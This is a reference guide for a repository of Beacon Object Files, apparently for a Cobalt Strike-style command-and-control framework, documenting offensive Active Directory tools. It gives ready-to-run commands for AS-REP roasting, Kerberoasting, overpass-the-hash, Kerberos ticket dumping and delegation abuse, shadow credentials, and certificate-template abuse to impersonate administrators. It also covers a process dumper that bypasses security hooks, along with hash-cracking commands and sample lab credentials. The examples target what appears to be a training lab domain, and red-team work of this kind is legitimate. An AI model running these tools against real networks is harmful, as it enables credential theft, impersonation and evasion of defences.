# BOF Reference Guide

This document lists all working Beacon Object Files (BOFs) in this repository, their usage, and expected outputs.

---

## Kerberos BOFs (kerbeus/)

### krb_klist
**Description:** Lists all cached Kerberos tickets in the current logon session.

**Usage:**
```
krb_klist [/luid:LOGONID]
```

**Parameters:**
- `/luid:LOGONID` (optional) - Target specific logon session

**Example:**
```
inline-execute C:\path\to\krb_klist.x64.o
```

**Output:** Displays detailed ticket information including:
- Server name
- Realm
- Start/End/Renew times
- Encryption type (AES256, RC4, etc.)
- Ticket flags

---

### krb_asreproast_auto
**Description:** Automatically discovers and AS-REP roasts users with DONT_REQUIRE_PREAUTH flag set.

**Usage:**
```
krb_asreproast_auto /dc:DC_IP [/domain:DOMAIN]
```

**Parameters:**
- `/dc:DC_IP` (required) - Domain controller IP or hostname
- `/domain:DOMAIN` (optional) - Target domain

**Example:**
```
inline-execute C:\path\to\krb_asreproast_auto.x64.o /dc:192.168.56.11
```

**Output:** Returns hashcat-compatible AS-REP hashes:
```
$krb5asrep$23$user@DOMAIN:salt$hash...
```

**Crack with:**
```
hashcat -m 18200 hashes.txt wordlist.txt
john --format=krb5asrep hashes.txt
```

---

### krb_spnenum
**Description:** Enumerates all Service Principal Names (SPNs) in the domain with detailed categorization.

**Usage:**
```
krb_spnenum /dc:DC_IP [/domain:DOMAIN]
```

**Parameters:**
- `/dc:DC_IP` (required) - Domain controller IP or hostname
- `/domain:DOMAIN` (optional) - Target domain

**Example:**
```
inline-execute C:\path\to\krb_spnenum.x64.o /dc:192.168.56.11
```

**Output:** Lists accounts with SPNs, categorized by service type:
- SQL Server
- Web Services (HTTP/HTTPS)
- Terminal Services (RDP)
- WinRM/PowerShell Remoting
- LDAP
- DNS
- Host services

Shows UAC flags including delegation types (CONSTRAINED_DELEG, TRUSTED_DELEG).

---

### krb_spnroast
**Description:** Targeted Kerberoasting - requests service tickets for specific SPNs.

**Usage:**
```
krb_spnroast /spns:SPN1,SPN2,... /dc:DC_IP [/format:hashcat|john]
```

**Parameters:**
- `/spns:LIST` (required) - Comma-separated list of SPNs
- `/dc:DC_IP` (required) - Domain controller IP
- `/format:hashcat|john` (optional) - Output format (default: hashcat)

**Example:**
```
inline-execute C:\path\to\krb_spnroast.x64.o /spns:HTTP/eyrie.north.sevenkingdoms.local /dc:192.168.56.11
```

**Output:** Returns Kerberos 5 TGS-REP hashes in hashcat format:
```
$krb5tgs$5$*user$DOMAIN$SPN*$hash...
```

**Crack with:**
```
hashcat -m 13100 hashes.txt wordlist.txt
```

---

### krb_asktgt
**Description:** Request a Ticket Granting Ticket (TGT) using password, hash, or certificate.

**Usage:**
```
krb_asktgt /user:USERNAME /password:PASSWORD /dc:DC_IP [/domain:DOMAIN] [/ptt]
krb_asktgt /user:USERNAME /rc4:HASH /dc:DC_IP [/domain:DOMAIN] [/ptt]
krb_asktgt /user:USERNAME /certificate:CERT.pfx /password:PFX_PASSWORD /dc:DC_IP [/domain:DOMAIN] [/ptt]
```

**Parameters:**
- `/user:USERNAME` (required) - Target user
- `/password:PASSWORD` - User password
- `/rc4:HASH` - NTLM hash for overpass-the-hash
- `/certificate:FILE` - Certificate file for PKINIT authentication
- `/dc:DC_IP` (required) - Domain controller IP
- `/domain:DOMAIN` (optional) - Target domain
- `/ptt` (optional) - Pass-the-ticket (import ticket)

**Example:**
```
inline-execute C:\path\to\krb_asktgt.x64.o /user:jon.snow /password:iknownothing /dc:192.168.56.11
```

**Output:** Returns base64-encoded TGT that can be used for authentication.

---

### krb_currentluid
**Description:** Retrieves the current process's Logon Session ID (LUID).

**Usage:**
```
krb_currentluid
```

**Example:**
```
inline-execute C:\path\to\krb_currentluid.x64.o
```

**Output:** Shows:
- High/Low parts of LUID
- Decimal representation
- Hex representation
- Token ID and type
- Number of groups and privileges

---

### krb_hash
**Description:** Calculates Kerberos password hashes (RC4-HMAC/NTLM).

**Usage:**
```
krb_hash /user:USERNAME /domain:DOMAIN /password:PASSWORD
```

**Parameters:**
- `/user:USERNAME` (required) - Username
- `/domain:DOMAIN` (required) - Domain (used for salt)
- `/password:PASSWORD` (required) - Password to hash

**Example:**
```
inline-execute C:\path\to\krb_hash.x64.o /domain:NORTH /user:eddard.stark /password:FightP3aceAndHonor!
```

**Output:** Returns:
- RC4-HMAC (NTLM) hash
- Salt for AES keys
- Instructions for generating AES keys with external tools

---

### krb_triage
**Description:** Quick triage view of all cached Kerberos tickets in table format.

**Usage:**
```
krb_triage [/luid:LOGONID]
```

**Parameters:**
- `/luid:LOGONID` (optional) - Target specific logon session

**Example:**
```
inline-execute C:\path\to\krb_triage.x64.o
```

**Output:** Compact table showing:
- Index number
- Server name (truncated)
- Encryption type
- Start time
- End time

---

### krb_kerberoasting
**Description:** Kerberoasting - request service tickets and extract crackable hashes.

**Usage:**
```
krb_kerberoasting /spn:SPN /dc:DC_IP [/format:hashcat|john]
```

**Parameters:**
- `/spn:SPN` (required) - Service Principal Name
- `/dc:DC_IP` (required) - Domain controller IP
- `/format:hashcat|john` (optional) - Output format

**Example:**
```
inline-execute C:\path\to\krb_kerberoasting.x64.o /spn:HTTP/eyrie.north.sevenkingdoms.local /dc:192.168.56.11
```

**Output:** Returns:
- Raw ticket in base64
- Crackable hash in specified format

**Note:** Similar to `krb_spnroast` but may have different hash extraction methods.

---

### krb_dump
**Description:** Dumps all cached Kerberos tickets as base64-encoded blobs.

**Usage:**
```
krb_dump [/luid:LOGONID] [/service:SERVICE]
```

**Parameters:**
- `/luid:LOGONID` (optional) - Target specific logon session
- `/service:SERVICE` (optional) - Filter by service name

**Example:**
```
inline-execute C:\path\to\krb_dump.x64.o
```

**Output:** Returns complete ticket data in base64 format for each cached ticket. Useful for:
- Ticket extraction
- Pass-the-ticket attacks
- Offline analysis

---

### krb_unconstrained
**Description:** Monitors for new TGTs in cache (for unconstrained delegation attacks).

**Usage:**
```
krb_unconstrained [/interval:SECONDS] [/count:N] [/export]
```

**Parameters:**
- `/interval:SECONDS` (optional) - Scan interval (default: 5)
- `/count:N` (optional) - Number of scans (default: 1)
- `/export` (optional) - Export captured TGTs

**Example:**
```
inline-execute C:\path\to\krb_unconstrained.x64.o
```

**Output:** Reports:
- New TGTs discovered during monitoring
- Total TGTs captured
- Base64-encoded TGT data (if `/export` used)

**Note:** Requires elevation and host must have unconstrained delegation enabled.

---

### krb_overpass
**Description:** Overpass-the-hash attack - request TGT using NTLM hash.

**Usage:**
```
krb_overpass /user:USERNAME /domain:DOMAIN /rc4:HASH /dc:DC_IP [/ptt]
```

**Parameters:**
- `/user:USERNAME` (required) - Target username
- `/domain:DOMAIN` (required) - Target domain
- `/rc4:HASH` (required) - NTLM/RC4 hash
- `/dc:DC_IP` (required) - Domain controller IP
- `/ptt` (optional) - Pass-the-ticket (import)

**Example:**
```
inline-execute C:\path\to\krb_overpass.x64.o /user:eddard.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11 /rc4:D977B98C6C9282C5C478BE1D97B237B8
```

**Output:** Returns base64-encoded AS-REP (TGT) obtained using the hash.

---

### krb_purge
**Description:** Purges all Kerberos tickets from a logon session.

**Usage:**
```
krb_purge [/luid:LOGONID]
```

**Parameters:**
- `/luid:LOGONID` (optional) - Target specific logon session

**Example:**
```
inline-execute C:\path\to\krb_purge.x64.o
```

**Output:** Confirms successful purge or displays error.

**Status:** ✅ FIXED - Now properly retrieves current session LUID

---

### krb_logonsession
**Description:** Enumerates all logon sessions and their Kerberos tickets.

**Usage:**
```
krb_logonsession [/current]
```

**Parameters:**
- `/current` (optional) - Show only current session

**Example:**
```
inline-execute C:\path\to\krb_logonsession.x64.o
```

**Output:** Lists all logon sessions with their tickets.

**Status:** ✅ FIXED - Linker error resolved

---

### krb_shadowcred
**Description:** Shadow Credentials attack - adds msDS-KeyCredentialLink attribute.

**Usage:**
```
krb_shadowcred /target:COMPUTER$ /domain:DOMAIN [/dc:DC]
```

**Parameters:**
- `/target:TARGET$` (required) - Target computer account
- `/domain:DOMAIN` (required) - Target domain
- `/dc:DC` (optional) - Domain controller

**Example:**
```
inline-execute C:\path\to\krb_shadowcred.x64.o /target:CASTLEBLACK$ /domain:north.sevenkingdoms.local
```

**Output:** Returns generated certificate and key data for authentication.

**Status:** ✅ FIXED - Missing symbols resolved

---

### krb_describe
**Description:** Parses and describes a Kerberos ticket structure.

**Usage:**
```
krb_describe /ticket:BASE64_TICKET
```

**Parameters:**
- `/ticket:BASE64` (required) - Base64-encoded ticket

**Example:**
```
inline-execute C:\path\to\krb_describe.x64.o /ticket:YIIGvAYJKo...
```

**Output:** Shows ticket structure including:
- Ticket type (AS-REP, TGS-REP, AP-REQ, KRB-CRED)
- Version
- Message type
- Realm
- Encryption type
- Field information

**Status:** ✅ FIXED - Linker error resolved

---

## Certificate BOFs (certify/)

### cert_find
**Description:** Finds vulnerable Active Directory Certificate Services (ADCS) templates.

**Usage:**
```
cert_find [/vulnerable] [/enrollee] [/clientauth] /domain:DOMAIN /dc:DC
```

**Parameters:**
- `/vulnerable` (optional) - Show only vulnerable templates
- `/enrollee` (optional) - Show templates where enrollee supplies subject
- `/clientauth` (optional) - Show templates with client auth
- `/domain:DOMAIN` (required) - Target domain
- `/dc:DC` (required) - Domain controller

**Example:**
```
inline-execute C:\path\to\cert_find.x64.o /vulnerable /domain:sevenkingdoms.local /dc:kingslanding.sevenkingdoms.local
```

**Output:** Lists certificate templates with:
- Template name and display name
- Vulnerability type (ESC1, ESC2, ESC3, ESC15)
- Copy/paste exploitation commands
- Schema version, key size, enrollment flags
- Extended Key Usages (EKUs)
- Capability summary

**Vulnerabilities Detected:**
- **ESC1:** Enrollee supplies subject + Client Auth
- **ESC2:** Any Purpose EKU
- **ESC3:** Certificate Request Agent
- **ESC15:** Schema v1 application policy bypass

**Status:** ✅ ENHANCED - Now auto-discovers CA name and fills it into exploitation commands

---

### cert_cas
**Description:** Enumerates Certificate Authorities in the domain.

**Usage:**
```
cert_cas [/domain:DOMAIN] [/dc:DC] [/showallpermissions] [/vulnerable]
```

**Parameters:**
- `/domain:DOMAIN` (optional) - Target domain
- `/dc:DC` (optional) - Domain controller
- `/showallpermissions` (optional) - Show all template permissions
- `/vulnerable` (optional) - Focus on vulnerable configurations

**Example:**
```
inline-execute C:\path\to\cert_cas.x64.o /domain:sevenkingdoms.local /dc:kingslanding.sevenkingdoms.local
```

**Output:** Lists CAs with:
- CA name and DNS name
- Published templates
- Certificate thumbprint
- Web enrollment availability
- ESC6/ESC8 notes

---

### cert_request
**Description:** Requests a certificate from a template.

**Usage:**
```
cert_request /ca:CA_NAME /template:TEMPLATE [/altname:UPN]
```

**Parameters:**
- `/ca:CA_NAME` (required) - CA in format `DC\CA-NAME`
- `/template:TEMPLATE` (required) - Template name
- `/altname:UPN` (optional) - Subject Alternative Name for impersonation

**Example:**
```
inline-execute C:\path\to\cert_request.x64.o /ca:kingslanding.sevenkingdoms.local\CA-NAME /template:User /altname:administrator@sevenkingdoms.local
```

**Output:** Returns:
- Certificate thumbprint (for export)
- Status of request
- Any errors

---

### cert_request_agent
**Description:** Uses enrollment agent certificate to request cert on behalf of another user (ESC3).

**Usage:**
```
cert_request_agent /ca:CA_NAME /template:TEMPLATE /onbehalfof:USER /agent:AGENT.pfx
```

**Parameters:**
- `/ca:CA_NAME` (required) - CA name
- `/template:TEMPLATE` (required) - Target template
- `/onbehalfof:DOMAIN\USER` (required) - User to impersonate
- `/agent:FILE` (required) - Enrollment agent certificate

**Example:**
```
inline-execute C:\path\to\cert_request_agent.x64.o /ca:DC\CA /template:User /onbehalfof:domain\administrator /agent:agent.pfx
```

**Output:** Returns certificate thumbprint for the impersonated user.

---

## Memory Dumper BOFs (memdumper/)

### memdumper
**Description:** Creates a MiniDump of a target process for analysis and debugging.

**Usage:**
```
memdumper /process:PROCESSNAME [/output:OUTPUTFOLDER]
```

**Parameters:**
- `/process:NAME` (required) - Target process name (with or without .exe)
- `/output:FOLDER` (optional) - Output folder for dump file (default: Desktop\CleanDump)

**Example:**
```
inline-execute C:\path\to\memdumper.x64.o /process:readyone
inline-execute C:\path\to\memdumper.x64.o /process:notepad /output:C:\Dumps
```

**Output:** Creates a `.dmp` file that can be opened with:
- Cheat Engine (File > Open Process > Open File)
- x64dbg (File > Open > Open Dump)
- WinDbg (File > Open Crash Dump)

**Features:**
- Loads a clean ntdll.dll from disk to bypass hooks
- Creates full memory dumps (MiniDumpWithFullMemory)
- Auto-generates timestamped filenames
- Reports dump file size on success

**Requirements:**
- Administrator/elevated privileges
- Target process must be running

**Status:** ✅ WORKING

---

## General Notes

### Ticket Formats
- All tickets are returned as base64-encoded blobs
- Can be used with `/ptt` flag to import directly
- Can be saved for offline use/analysis

### Hash Formats
- **AS-REP hashes:** hashcat mode 18200, john format krb5asrep
- **TGS hashes:** hashcat mode 13100, john format krb5tgs

### Common Flags
- `/dc:IP` - Domain controller IP or hostname
- `/domain:DOMAIN` - Target domain (often auto-detected)
- `/luid:ID` - Target specific logon session
- `/ptt` - Pass-the-ticket (import ticket to cache)

### Compilation
Compile all BOFs with:
```
compile_all.bat
```

Individual BOF compilation:
```
cd kerbeus
compile_all.bat

cd certify
compile_all.bat
```

---

## Quick Reference

### Enumeration
```
krb_spnenum /dc:DC          - Find all SPNs
cert_find /vulnerable       - Find vulnerable cert templates
cert_cas                    - Enumerate CAs
krb_klist                   - List cached tickets
krb_triage                  - Quick ticket overview
```

### Credential Harvesting
```
krb_asreproast_auto /dc:DC  - AS-REP roast vulnerable users
krb_spnroast /spns:SPN      - Kerberoast specific SPNs
krb_dump                    - Dump all tickets
```

### Authentication
```
krb_asktgt /user:X /password:Y    - Get TGT with password
krb_overpass /user:X /rc4:HASH    - Get TGT with hash
krb_asktgt /user:X /certificate:  - Get TGT with certificate
```

### Utility
```
krb_currentluid             - Get current LUID
krb_hash /password:X        - Calculate password hashes
krb_describe /ticket:BASE64 - Parse ticket structure
krb_purge                   - Clear ticket cache
```

### Memory Analysis
```
memdumper /process:NAME     - Create MiniDump for debugging
```
